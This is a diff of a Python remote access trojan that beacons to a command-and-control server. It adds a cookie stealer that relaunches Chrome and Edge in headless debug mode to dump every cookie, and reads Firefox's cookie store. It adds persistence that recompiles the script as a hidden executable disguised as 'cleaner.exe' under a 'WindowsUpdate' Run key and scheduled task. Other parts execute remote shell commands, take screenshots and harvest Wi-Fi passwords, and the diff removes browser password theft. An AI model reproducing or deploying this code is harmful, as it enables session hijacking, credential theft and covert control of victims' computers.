@@ -1,48 +1,3 @@
-﻿import sys
-import subprocess
-import importlib
-
-# List of required modules (standard libs are ignored; pip won't install them)
-REQUIRED_MODULES = [
-    'pyautogui',      # Screenshots/GUI control
-    'psutil',         # System info/processes
-    'requests',       # HTTP requests
-    'pywin32',        # win32crypt (for credential harvesting)
-    'pynput',         # Keylogger
-    'Crypto',         # PyCryptodome (AES encryption)
-    'socketio',       # WebSocket client (if used)
-    'urllib3',        # Disabling SSL warnings
-]
-
-def check_dependencies():
-    missing_modules = []
-    for module in REQUIRED_MODULES:
-        try:
-            importlib.import_module(module)
-        except ImportError:
-            missing_modules.append(module)
-    
-    if missing_modules:
-        print(f"[!] Missing modules: {', '.join(missing_modules)}")
-        print("[*] Attempting to install them...")
-        
-        for module in missing_modules:
-            try:
-                # Handle pywin32 separately (its pip name differs)
-                if module == 'pywin32':
-                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32'])
-                else:
-                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', module])
-                print(f"  [+] Installed: {module}")
-            except subprocess.CalledProcessError:
-                print(f"  [!] Failed to install: {module}")
-                sys.exit(1)
-
-# Run the check
-check_dependencies()
-
-
-
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import os
@@ -79,7 +34,7 @@ import socketio
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://10.10.8.3"
+        self.C2_SERVER = "https://192.168.16.78"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -88,7 +43,7 @@ class Config:
         self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
         self.DEBUG = True
         self.TAKE_SCREENSHOTS = True
-        self.SCREENSHOT_FREQUENCY = 10
+        self.SCREENSHOT_FREQUENCY = 30
 
 # ======================
 # Encryption
@@ -115,122 +70,9 @@ class Crypto:
         return json.loads(unpad(pt, AES.block_size))
 
 # ======================
-# Credential Harvesting
+# Credential Harvester
 # ======================
 class CredentialHarvester:
-    @staticmethod
-    def get_chrome_credentials():
-        try:
-            credentials = []
-            chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 
-                                     'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
-            
-            if not os.path.exists(chrome_path):
-                return credentials
-
-            temp_db = os.path.join(os.getenv('TEMP'), 'chrome_temp.db')
-            if os.path.exists(temp_db):
-                os.remove(temp_db)
-            
-            shutil.copy2(chrome_path, temp_db)
-            
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
-            
-            for url, user, encrypted_pw in cursor.fetchall():
-                try:
-                    password = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1]
-                    if password:
-                        credentials.append({
-                            "browser": "chrome",
-                            "url": url,
-                            "username": user,
-                            "password": password.decode('utf-8', errors='ignore')
-                        })
-                except:
-                    continue
-            
-            conn.close()
-            os.remove(temp_db)
-            return credentials
-        except Exception as e:
-            return []
-
-    @staticmethod
-    def get_firefox_credentials():
-        try:
-            credentials = []
-            profiles = []
-            ff_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox')
-            
-            if os.path.exists(os.path.join(ff_path, 'profiles.ini')):
-                config = configparser.ConfigParser()
-                config.read(os.path.join(ff_path, 'profiles.ini'))
-                
-                for section in config.sections():
-                    if section.startswith('Profile'):
-                        profiles.append(os.path.join(ff_path, config[section]['Path']))
-            
-            for profile in profiles:
-                logins_path = os.path.join(profile, 'logins.json')
-                if os.path.exists(logins_path):
-                    with open(logins_path, 'r', encoding='utf-8') as f:
-                        data = json.load(f)
-                    
-                    for login in data.get('logins', []):
-                        try:
-                            credentials.append({
-                                "browser": "firefox",
-                                "url": login['hostname'],
-                                "username": login['encryptedUsername'],
-                                "password": login['encryptedPassword']
-                            })
-                        except:
-                            continue
-            return credentials
-        except:
-            return []
-
-    @staticmethod
-    def get_edge_credentials():
-        try:
-            credentials = []
-            edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 
-                                    'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
-            
-            if not os.path.exists(edge_path):
-                return credentials
-
-            temp_db = os.path.join(os.getenv('TEMP'), 'edge_temp.db')
-            if os.path.exists(temp_db):
-                os.remove(temp_db)
-            
-            shutil.copy2(edge_path, temp_db)
-            
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
-            
-            for url, user, encrypted_pw in cursor.fetchall():
-                try:
-                    password = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1]
-                    if password:
-                        credentials.append({
-                            "browser": "edge",
-                            "url": url,
-                            "username": user,
-                            "password": password.decode('utf-8', errors='ignore')
-                        })
-                except:
-                    continue
-            
-            conn.close()
-            os.remove(temp_db)
-            return credentials
-        except:
-            return []
-
     @staticmethod
     def get_wifi_passwords():
         try:
@@ -255,6 +97,358 @@ class CredentialHarvester:
             return wifi_passwords
         except:
             return []
+
+# ======================
+# Cookie Stealer
+# ======================
+class CookieStealer:
+    def __init__(self, logger=None):
+        self.logger = logger or self._create_default_logger()
+        self.chrome_debug_port = 9222
+        self.edge_debug_port = 9223
+        self.timeout = 10
+        self.unique_domains = set()
+        
+        # Browser configurations
+        self.CHROME_PATH = rf"C:\Program Files\Google\Chrome\Application\chrome.exe"
+        self.CHROME_USER_DATA_DIR = rf'{os.getenv("LOCALAPPDATA")}\Google\Chrome\User Data'
+        self.CHROME_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'chrome_cookies.json')
+
+        self.EDGE_PATH = rf"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+        self.EDGE_USER_DATA_DIR = rf'{os.getenv("LOCALAPPDATA")}\Microsoft\Edge\User Data'
+        self.EDGE_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'edge_cookies.json')
+
+        self.FIREFOX_PROFILE_DIR = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
+        self.FIREFOX_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'firefox_cookies.json')
+
+    def steal_cookies(self):
+        """Main method to steal cookies from all browsers"""
+        results = []
+        
+        # Chrome
+        chrome_data = self._process_browser_cookies(
+            'chrome',
+            self.CHROME_PATH,
+            self.chrome_debug_port,
+            self.CHROME_USER_DATA_DIR
+        )
+        if chrome_data:
+            results.append(chrome_data)
+        
+        # Edge
+        edge_data = self._process_browser_cookies(
+            'edge',
+            self.EDGE_PATH,
+            self.edge_debug_port,
+            self.EDGE_USER_DATA_DIR
+        )
+        if edge_data:
+            results.append(edge_data)
+        
+        # Firefox
+        firefox_data = self._process_firefox_cookies()
+        if firefox_data:
+            results.append(firefox_data)
+        
+        return results
+
+    def _process_browser_cookies(self, browser_name, browser_path, port, user_data_dir):
+        """Process Chrome/Edge cookies"""
+        try:
+            self._log('info', f"Processing {browser_name} cookies")
+            
+            # Start browser in debug mode
+            proc = self._start_browser_debug(browser_path, port, user_data_dir)
+            if not proc:
+                return None
+
+            # Wait for browser to start
+            time.sleep(5)
+            
+            # Get cookies via debug protocol
+            cookies = self._get_cookies_via_debug(port)
+            
+            # Clean up browser process
+            proc.terminate()
+            proc.wait()
+
+            if not cookies:
+                return None
+
+            # Transform cookies to standard format
+            transformed = self._transform_cookies(cookies)
+            
+            # Package cookies for transmission
+            return self._package_cookies(transformed, browser_name)
+
+        except Exception as e:
+            self._log('error', f"{browser_name} cookie processing failed: {str(e)}")
+            return None
+
+    def _process_firefox_cookies(self):
+        """Process Firefox cookies"""
+        try:
+            self._log('info', "Processing Firefox cookies")
+            
+            # Find Firefox profile
+            profile_dir = self._find_firefox_profile()
+            if not profile_dir:
+                return None
+
+            # Extract cookies from SQLite database
+            cookies = self._extract_firefox_cookies(profile_dir)
+            if not cookies:
+                return None
+
+            # Transform to standard format
+            transformed = self._transform_cookies(cookies)
+            
+            # Package for transmission
+            return self._package_cookies(transformed, 'firefox')
+
+        except Exception as e:
+            self._log('error', f"Firefox cookie processing failed: {str(e)}")
+            return None
+
+    def _transform_cookies(self, cookies):
+        """Transform cookies into standard format with corrected sameSite values"""
+        transformed = []
+        for cookie in cookies:
+            if len(cookie) == 8:  # Firefox cookies
+                name, value, domain, path, expiry, is_secure, is_http_only, same_site = cookie
+            else:  # Chrome/Edge cookies
+                name = cookie['name']
+                value = cookie['value']
+                domain = cookie['domain']
+                path = cookie['path']
+                expiry = cookie.get('expires', 0)
+                is_secure = cookie.get('secure', False)
+                is_http_only = cookie.get('httpOnly', False)
+                same_site = cookie.get('sameSite', 'unspecified')
+            
+            # Fix sameSite values to match allowed options
+            if same_site.lower() == 'none':
+                same_site = 'no_restriction'
+            elif same_site.lower() == 'lax':
+                same_site = 'lax'
+            elif same_site.lower() == 'strict':
+                same_site = 'strict'
+            else:
+                same_site = 'unspecified'  # default if not matching any known value
+            
+            transformed_cookie = {
+                "domain": domain,
+                "expirationDate": expiry,
+                "hostOnly": not domain.startswith('.'),
+                "httpOnly": bool(is_http_only),
+                "name": name,
+                "path": path,
+                "sameSite": same_site,
+                "secure": bool(is_secure),
+                "session": expiry == 0,
+                "storeId": "0",
+                "value": value
+            }
+            transformed.append(transformed_cookie)
+        return transformed
+
+    def _start_browser_debug(self, browser_path, port, user_data_dir):
+        """Start browser in debug mode"""
+        try:
+            self._kill_browser(os.path.basename(browser_path))
+            command = [
+                browser_path,
+                f'--remote-debugging-port={port}',
+                '--remote-allow-origins=*',
+                '--headless',
+                f'--user-data-dir={user_data_dir}'
+            ]
+            return subprocess.Popen(command, 
+                                  stdout=subprocess.DEVNULL,
+                                  stderr=subprocess.DEVNULL)
+        except Exception as e:
+            self._log('error', f"Failed to start browser: {str(e)}")
+            return None
+
+    def _kill_browser(self, process_name):
+        """Kill browser process if running"""
+        try:
+            subprocess.run(f'taskkill /F /IM {process_name}', shell=True,
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+
+    def _get_cookies_via_debug(self, port):
+        """Get cookies using Chrome DevTools Protocol"""
+        try:
+            debug_url = f'http://localhost:{port}/json'
+            response = requests.get(debug_url, timeout=self.timeout)
+            response.raise_for_status()
+            
+            data = response.json()
+            if not data:
+                return []
+                
+            ws_url = data[0]['webSocketDebuggerUrl']
+            ws = websocket.create_connection(ws_url, timeout=self.timeout)
+            
+            ws.send(json.dumps({
+                'id': 1,
+                'method': 'Network.getAllCookies'
+            }))
+            
+            response = json.loads(ws.recv())
+            return response['result']['cookies']
+        except Exception as e:
+            self._log('error', f"Debug protocol error: {str(e)}")
+            return []
+        finally:
+            if 'ws' in locals():
+                ws.close()
+
+    def _find_firefox_profile(self):
+        """Find Firefox profile directory"""
+        try:
+            for profile in os.listdir(self.FIREFOX_PROFILE_DIR):
+                if profile.endswith('.default-release'):
+                    return os.path.join(self.FIREFOX_PROFILE_DIR, profile)
+            return None
+        except Exception as e:
+            self._log('error', f"Failed to find Firefox profile: {str(e)}")
+            return None
+
+    def _extract_firefox_cookies(self, profile_dir):
+        """Extract cookies from Firefox SQLite database"""
+        try:
+            cookies_db = os.path.join(profile_dir, 'cookies.sqlite')
+            if not os.path.exists(cookies_db):
+                return []
+                
+            conn = sqlite3.connect(cookies_db)
+            cursor = conn.cursor()
+            
+            # Modified query to ensure all fields are properly handled
+            cursor.execute("""
+                SELECT 
+                    CAST(name AS TEXT) as name,
+                    CAST(value AS TEXT) as value,
+                    CAST(host AS TEXT) as host,
+                    CAST(path AS TEXT) as path,
+                    CAST(expiry AS INTEGER) as expiry,
+                    CAST(isSecure AS INTEGER) as isSecure,
+                    CAST(isHttpOnly AS INTEGER) as isHttpOnly,
+                    CAST(sameSite AS INTEGER) as sameSite 
+                FROM moz_cookies
+            """)
+            
+            cookies = []
+            for row in cursor.fetchall():
+                try:
+                    # Ensure all values are properly converted
+                    cookies.append((
+                        str(row[0]),  # name
+                        str(row[1]),  # value
+                        str(row[2]),  # host
+                        str(row[3]),  # path
+                        int(row[4]) if row[4] else 0,  # expiry
+                        bool(row[5]),  # isSecure
+                        bool(row[6]),  # isHttpOnly
+                        str(row[7]) if row[7] else 'none'  # sameSite
+                    ))
+                except Exception as e:
+                    self._log('error', f"Error processing Firefox cookie: {str(e)}")
+                    continue
+            
+            conn.close()
+            return cookies
+        except Exception as e:
+            self._log('error', f"Failed to extract Firefox cookies: {str(e)}")
+            return []
+
+    def _get_system_info(self):
+        """Get system information."""
+        try:
+            ip_info = requests.get('https://ipinfo.io', timeout=5).json()
+            return {
+                'ip_address': ip_info.get('ip', 'Unknown'),
+                'location': f"{ip_info.get('city', 'Unknown')}, {ip_info.get('country', 'Unknown')}",
+                'username': os.getenv('USERNAME'),
+                'computer_name': os.getenv('COMPUTERNAME'),
+                'windows_version': platform.version(),
+                'user_agent': self.config.USER_AGENT if hasattr(self, 'config') else 'Unknown'
+            }
+        except Exception as e:
+            return {
+                'ip_address': 'Unknown',
+                'location': 'Unknown',
+                'username': 'Unknown',
+                'computer_name': 'Unknown',
+                'windows_version': 'Unknown',
+                'user_agent': 'Unknown'
+            }
+
+    def _extract_unique_domains(self, cookies):
+        """Extract unique domains from cookies."""
+        unique_domains = set()
+        for cookie in cookies:
+            domain = cookie.get('domain', '')
+            if domain:
+                unique_domains.add(domain)
+        return list(unique_domains)
+
+    def _package_cookies(self, cookies, browser_name):
+        """Package cookies into base64 encoded JSON with system info"""
+        try:
+            if not cookies:
+                return None
+                
+            # Extract unique domains
+            unique_domains = self._extract_unique_domains(cookies)
+            self.unique_domains.update(unique_domains)
+            
+            # Get system info
+            system_info = self._get_system_info()
+            
+            # Create temporary file
+            temp_dir = os.path.join(os.getenv('TEMP'), 'cookie_stealer')
+            os.makedirs(temp_dir, exist_ok=True)
+            
+            temp_file = os.path.join(temp_dir, f'{browser_name}_cookies.json')
+            with open(temp_file, 'w') as f:
+                json.dump(cookies, f, indent=4)
+            
+            # Read file content
+            with open(temp_file, 'rb') as f:
+                cookie_data = f.read()
+            
+            # Clean up
+            os.remove(temp_file)
+            
+            return {
+                'browser': browser_name,
+                'zip_content': base64.b64encode(cookie_data).decode('utf-8'),
+                'system_info': {
+                    **system_info,
+                    'unique_domains': unique_domains,
+                    'all_domains': list(self.unique_domains)
+                }
+            }
+        except Exception as e:
+            self._log('error', f"Failed to package {browser_name} cookies: {str(e)}")
+            return None
+
+    def _create_default_logger(self):
+        logger = logging.getLogger('CookieStealer')
+        if not logger.handlers:
+            handler = logging.StreamHandler()
+            handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
+            logger.addHandler(handler)
+            logger.setLevel(logging.INFO)
+        return logger
+
+    def _log(self, level, message):
+        if self.logger:
+            getattr(self.logger, level)(message)
 
 # ======================
 # System Functions
@@ -373,15 +567,49 @@ class Persistence:
             if platform.system() != "Windows":
                 return {"status": "error", "message": "Only Windows supported"}
             
+            # Create target directory if it doesn't exist
+            target_dir = os.path.join(os.getenv('PROGRAMDATA'), 'Windows')
+            os.makedirs(target_dir, exist_ok=True)
+            exe_path = os.path.join(target_dir, 'cleaner.exe')
+            
+            # Build the executable using PyInstaller
+            try:
+                import PyInstaller.__main__
+                
+                # Create a temporary spec file
+                temp_dir = os.path.join(os.getenv('TEMP'), 'pyinstaller_temp')
+                os.makedirs(temp_dir, exist_ok=True)
+                
+                # PyInstaller arguments
+                pyinstaller_args = [
+                    '--onefile',
+                    '--noconsole',
+                    '--name=cleaner',
+                    '--distpath=' + target_dir,
+                    '--workpath=' + temp_dir,
+                    '--specpath=' + temp_dir,
+                    __file__
+                ]
+                
+                # Run PyInstaller
+                PyInstaller.__main__.run(pyinstaller_args)
+                
+                # Clean up temporary files
+                shutil.rmtree(temp_dir)
+                shutil.rmtree(os.path.join(os.path.dirname(__file__), '__pycache__'), ignore_errors=True)
+                
+            except Exception as e:
+                return {"status": "error", "message": f"PyInstaller failed: {str(e)}"}
+            
             # Registry persistence
             key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
             key = winreg.HKEY_CURRENT_USER
             try:
                 reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
-                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " " + __file__)
+                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
                 winreg.CloseKey(reg_key)
-            except:
-                return {"status": "error", "message": "Failed to set registry key"}
+            except Exception as e:
+                return {"status": "error", "message": f"Failed to set registry key: {str(e)}"}
             
             # Scheduled task
             try:
@@ -427,8 +655,7 @@ class Persistence:
                     </Settings>
                     <Actions Context="Author">
                         <Exec>
-                            <Command>{sys.executable}</Command>
-                            <Arguments>"{__file__}"</Arguments>
+                            <Command>{exe_path}</Command>
                         </Exec>
                     </Actions>
                 </Task>
@@ -440,14 +667,15 @@ class Persistence:
                 
                 subprocess.run(
                     ['schtasks', '/Create', '/TN', task_name, '/XML', xml_path, '/F'],
-                    creationflags=subprocess.CREATE_NO_WINDOW
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    check=True
                 )
                 
                 os.remove(xml_path)
-            except:
-                return {"status": "error", "message": "Failed to create scheduled task"}
+            except Exception as e:
+                return {"status": "error", "message": f"Failed to create scheduled task: {str(e)}"}
             
-            return {"status": "success", "message": "Persistence installed"}
+            return {"status": "success", "message": "Persistence installed", "exe_path": exe_path}
         except Exception as e:
             return {"status": "error", "message": str(e)}
 
@@ -661,7 +889,6 @@ class WebSocketClient:
         handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
         self.logger.addHandler(handler)
 
-
     def _setup_event_handlers(self):
         """Setup all WebSocket event handlers"""
         @self.socket.on('execute_command', namespace='/terminal')
@@ -691,7 +918,6 @@ class WebSocketClient:
                     'error': f"Command processing error: {str(e)}",
                     'current_dir': self.current_dir
                 }, namespace='/terminal')
-
 
     def connect(self):
         try:
@@ -755,7 +981,6 @@ class WebSocketClient:
             self.logger.error(f"WebSocket connection failed: {str(e)}")
             return False
         
-
     def _execute_command(self, command):
         try:
             self.logger.info(f"Executing: {command}")
@@ -806,6 +1031,7 @@ class WebSocketClient:
                 'error': str(e),
                 'current_dir': self.current_dir
             }
+
     def disconnect(self):
         if self.socket:
             try:
@@ -840,6 +1066,22 @@ class Agent:
         handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
         self.logger.addHandler(handler)
 
+    def _log(self, level, message):
+        if level == 'debug':
+            self.logger.debug(message)
+        elif level == 'info':
+            self.logger.info(message)
+        elif level == 'warning':
+            self.logger.warning(message)
+        elif level == 'error':
+            self.logger.error(message)
+
+    def _log_error(self, message):
+        self.logger.error(message)
+
+    def _log_info(self, message):
+        self.logger.info(message)
+
     def _generate_agent_id(self):
         return f"{platform.node()}-{os.getlogin()}-{hash(os.getcwd())}"
 
@@ -851,18 +1093,17 @@ class Agent:
             "os": platform.platform(),
             "privilege": "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user",
             "ip": requests.get('https://api.ipify.org', timeout=5).text,
-            "timestamp": datetime.now().isoformat()
+            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
         }
 
         if not self._initial_checkin or (time.time() - self._initial_checkin) > 86400:
             data["credentials"] = {
-                "browsers": CredentialHarvester.get_chrome_credentials() + 
-                           CredentialHarvester.get_firefox_credentials() + 
-                           CredentialHarvester.get_edge_credentials(),
+                
                 "wifi": CredentialHarvester.get_wifi_passwords()
             }
             if not self._initial_checkin:
                 self._initial_checkin = time.time()
+        
         if self.config.TAKE_SCREENSHOTS:
             if self._checkin_count % self.config.SCREENSHOT_FREQUENCY == 0:
                 screenshot = SystemUtils.take_screenshot()
@@ -875,23 +1116,23 @@ class Agent:
     def _execute_task(self, task):
         try:
             task_type = task.get("type")
-            self.logger.info(f"Received task: {json.dumps(task, indent=2)}")  # Debug logging
+            self._log_info(f"Received task: {json.dumps(task, indent=2)}")
             
+            # Handle different task types from web interface
             if task_type == "websocket":
-                # Get action from both possible locations in the task structure
                 action = task.get("action") or task.get("data", {}).get("action")
                 if not action:
-                    self.logger.error("WebSocket task missing action parameter")
+                    self._log_error("WebSocket task missing action parameter")
                     return {
                         "status": "error",
                         "message": "WebSocket task requires 'action' parameter"
                     }
                 
-                self.logger.info(f"Processing WebSocket {action} request")
+                self._log_info(f"Processing WebSocket {action} request")
                 
                 if action == "start":
                     if not hasattr(self, 'ws_client') or not self.ws_client:
-                        self.logger.info("Initializing new WebSocket client")
+                        self._log_info("Initializing new WebSocket client")
                         self.ws_client = WebSocketClient(
                             self.agent_id,
                             self.crypto,
@@ -900,7 +1141,7 @@ class Agent:
                         )
                     
                     if not self.ws_client.connected:
-                        self.logger.info("Attempting WebSocket connection...")
+                        self._log_info("Attempting WebSocket connection...")
                         if self.ws_client.connect():
                             return {
                                 "status": "success",
@@ -932,13 +1173,15 @@ class Agent:
                         "message": "No active WebSocket connection",
                         "action": "stop"
                     }
-        
             
-            elif task_type == "terminal":
-                command = task.get("cmd", "")
+            elif task_type == "shell":
+                # This matches the "shell" option in the web interface
+                command = task.get("data", {}).get("cmd", "")
                 if not command:
-                    task_data = task.get("data", {})
-                    command = task_data.get("cmd", "")
+                    return {
+                        "status": "error",
+                        "message": "No command provided"
+                    }
                 
                 current_dir = os.getcwd()
                 
@@ -975,7 +1218,8 @@ class Agent:
                     "status": "success",
                     "output": result.stdout,
                     "error": result.stderr,
-                    "current_dir": current_dir
+                    "current_dir": current_dir,
+                    "terminal": True  # This flag helps the server identify terminal output
                 }
             
             elif task_type == "screenshot":
@@ -983,18 +1227,36 @@ class Agent:
                 if screenshot:
                     return {
                         "status": "success",
-                        "screenshot": screenshot,
-                        "content_type": "image/png"
+                        "screenshot": screenshot
                     }
                 return {"status": "error", "message": "Failed to capture screenshot"}
             
-            elif task_type == "harvest_creds":
-                return {
-                    "browsers": CredentialHarvester.get_chrome_credentials() + 
-                                CredentialHarvester.get_firefox_credentials() + 
-                                CredentialHarvester.get_edge_credentials(),
-                    "wifi": CredentialHarvester.get_wifi_passwords()
-                }
+            
+            
+            elif task_type == "steal_cookies":
+                try:
+                    self._log_info("Starting cookie stealing task")
+                    stealer = CookieStealer(logger=self.logger)
+                    results = stealer.steal_cookies()
+                    
+                    if not results:
+                        return {
+                            "status": "error",
+                            "message": "No cookies were stolen"
+                        }
+                    
+                    return {
+                        "status": "success",
+                        "message": f"Stole cookies from {len(results)} browsers",
+                        "results": results
+                    }
+                except Exception as e:
+                    self._log_error(f"Cookie stealing failed: {str(e)}")
+                    return {
+                        "status": "error",
+                        "message": str(e)
+                    }
+
             
             elif task_type == "upload":
                 return SystemUtils.upload_file(task.get("path", ""))
@@ -1005,6 +1267,7 @@ class Agent:
                     task.get("data", ""))
             
             elif task_type == "persist":
+                self._log_info("Installing persistence")
                 return Persistence.install()
             
             elif task_type == "inject":
@@ -1033,14 +1296,14 @@ class Agent:
                 }
         
         except Exception as e:
-            self.logger.error(f"Error executing task: {str(e)}")
+            self._log_error(f"Error executing task: {str(e)}")
             return {
                 "status": "error",
                 "message": f"Task execution failed: {str(e)}"
             }
 
     def beacon(self):
-        self.logger.info("[*] Starting beacon loop...")
+        self._log_info("[*] Starting beacon loop...")
         while self._running:
             try:
                 sleep_time = self.config.CHECKIN_INTERVAL * (1 + (random.random() * self.jitter * 2 - self.jitter))
@@ -1083,10 +1346,10 @@ class Agent:
                         )
                 
             except requests.exceptions.RequestException as e:
-                self.logger.error(f"Connection error: {str(e)}")
+                self._log_error(f"Connection error: {str(e)}")
                 time.sleep(self.config.CHECKIN_INTERVAL * 2)
             except Exception as e:
-                self.logger.error(f"Unexpected error: {str(e)}")
+                self._log_error(f"Unexpected error: {str(e)}")
                 time.sleep(self.config.CHECKIN_INTERVAL)
 
     def stop(self):
@@ -1097,7 +1360,7 @@ class Agent:
             self.ws_client.disconnect()
 
     def run(self):
-        self.logger.info("[*] Starting agent...")
+        self._log_info("[*] Starting agent...")
         self.beacon()
 
 if __name__ == "__main__":
